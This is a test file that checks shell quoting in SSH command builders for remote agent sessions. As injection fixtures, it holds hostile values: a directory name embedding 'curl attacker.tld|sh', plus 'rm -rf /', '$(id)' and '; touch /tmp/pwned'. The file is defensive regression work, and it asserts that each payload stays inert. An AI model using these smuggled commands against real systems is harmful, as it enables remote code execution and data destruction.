import { describe, expect, it } from 'vitest';
import type { AgentSessionConfig } from '@shared/agent-session';
import { buildSshEnvPrefix, resolveSshCommand } from './spawn-utils';

function makeAgentConfig(overrides: Partial<AgentSessionConfig> = {}): AgentSessionConfig {
  return {
    taskId: 'task-1',
    conversationId: 'conv-1',
    providerId: 'claude',
    command: 'claude',
    args: ['--resume', 'conv-1'],
    cwd: '/workspace',
    autoApprove: false,
    resume: false,
    ...overrides,
  };
}

/**
 * Reverses one layer of quoteShellArg, so assertions can read the command the
 * remote `bash -l -c` actually receives instead of its escaped-on-the-wire
 * spelling. Mirrors the `'\''` idiom quoteShellArg emits.
 */
function unwrapShellArg(quoted: string): string {
  expect(quoted.startsWith("'")).toBe(true);
  expect(quoted.endsWith("'")).toBe(true);
  return quoted.slice(1, -1).split(`'\\''`).join("'");
}

/** The command string carried inside `bash -l -c <arg>`. */
function remoteCommandOf(result: string): string {
  const prefix = 'bash -l -c ';
  expect(result.startsWith(prefix)).toBe(true);
  return unwrapShellArg(result.slice(prefix.length));
}

describe('resolveSshCommand', () => {
  it('runs remote commands through a login shell so PATH matches install/probe', () => {
    const remote = remoteCommandOf(resolveSshCommand('agent', makeAgentConfig()));

    expect(remote).toBe(`cd '/workspace' && 'claude' '--resume' 'conv-1'`);
  });

  it('adds SSH env exports before the remote command', () => {
    const remote = remoteCommandOf(
      resolveSshCommand('agent', makeAgentConfig(), {
        FOO: 'bar',
      })
    );

    expect(remote).toBe(`cd '/workspace' && export FOO='bar'; 'claude' '--resume' 'conv-1'`);
  });

  it('preserves remote tmux wrapping for SSH commands', () => {
    const remote = remoteCommandOf(
      resolveSshCommand('agent', makeAgentConfig({ tmuxSessionName: 'agent-session' }))
    );

    expect(remote).toContain(`tmux has-session -t 'agent-session'`);
    expect(remote).toContain(`tmux new-session -d -s 'agent-session'`);
    expect(remote).toContain(`tmux attach-session -t 'agent-session'`);
    // tmux re-parses its command argument with a fresh shell, so the whole
    // argv line is deliberately passed as ONE already-quoted word.
    expect(remote).toContain(`tmux new-session -d -s 'agent-session' '`);
  });

  /**
   * The vulnerability this suite exists to pin: `cd` was built with
   * JSON.stringify, and double quotes leave $(...), backticks and $VAR live for
   * the remote shell to expand before any user command runs. These assert the
   * metacharacters are inert, not merely that the emitted string changed.
   */
  describe('remote command injection', () => {
    it('renders a command substitution in the working directory inert', () => {
      // Git refnames forbid spaces but permit $ ( ) ` ; | &, and a worktree
      // path is path.join(pool, branchName) — so a hostile branch name in a
      // cloned repo reaches cwd verbatim.
      const cwd = '/pool/feat$(curl attacker.tld|sh)';
      const remote = remoteCommandOf(resolveSshCommand('agent', makeAgentConfig({ cwd })));

      expect(remote.startsWith(`cd '/pool/feat$(curl attacker.tld|sh)'`)).toBe(true);
      // Double quoting is what made the substitution live; it must not return.
      expect(remote).not.toContain('cd "');
    });

    it('renders backticks, $VAR and a command separator in the working directory inert', () => {
      const cwd = '/pool/`id`$HOME;rm -rf /';
      const remote = remoteCommandOf(resolveSshCommand('agent', makeAgentConfig({ cwd })));

      expect(remote.startsWith(`cd '/pool/\`id\`$HOME;rm -rf /'`)).toBe(true);
      expect(remote).not.toContain('cd "');
    });

    it('escapes a single quote in the working directory without breaking out', () => {
      const remote = remoteCommandOf(
        resolveSshCommand('agent', makeAgentConfig({ cwd: `/tmp/it's here` }))
      );

      // End the quoted region, emit an escaped quote, reopen it.
      expect(remote.startsWith(`cd '/tmp/it'\\''s here'`)).toBe(true);
    });

    it('keeps a hostile argument as a single word instead of shell syntax', () => {
      const remote = remoteCommandOf(
        resolveSshCommand(
          'agent',
          makeAgentConfig({ args: ['--resume', '; touch /tmp/pwned', '$(id)'] })
        )
      );

      expect(remote).toContain(`'claude' '--resume' '; touch /tmp/pwned' '$(id)'`);
    });

    it('quotes a command name carrying metacharacters', () => {
      const remote = remoteCommandOf(
        resolveSshCommand('agent', makeAgentConfig({ command: 'claude;id' }))
      );

      expect(remote).toContain(`'claude;id'`);
      expect(remote).not.toContain('&& claude;id');
    });
  });
});

describe('buildSshEnvPrefix', () => {
  it('quotes a value so it cannot run a command', () => {
    expect(buildSshEnvPrefix({ FOO: '$(id)' })).toBe(`export FOO='$(id)'; `);
  });

  it('escapes a single quote inside a value', () => {
    expect(buildSshEnvPrefix({ FOO: `a'b` })).toBe(`export FOO='a'\\''b'; `);
  });

  it('emits nothing when there are no variables', () => {
    expect(buildSshEnvPrefix({})).toBe('');
  });

  /**
   * A name is a bare shell word in `export NAME=...` and cannot be quoted
   * without exporting a literal 'NAME', so it is validated instead — and an
   * unusable name is a programming error, not something to drop silently.
   */
  it('throws on a name carrying shell syntax rather than exporting it', () => {
    expect(() => buildSshEnvPrefix({ 'FOO=x; rm -rf /': 'v' })).toThrow(
      /Invalid environment variable name/
    );
    expect(() => buildSshEnvPrefix({ 'FOO$(id)': 'v' })).toThrow(
      /Invalid environment variable name/
    );
  });

  it('accepts an ordinary name', () => {
    expect(buildSshEnvPrefix({ _FOO_1: 'v' })).toBe(`export _FOO_1='v'; `);
  });
});
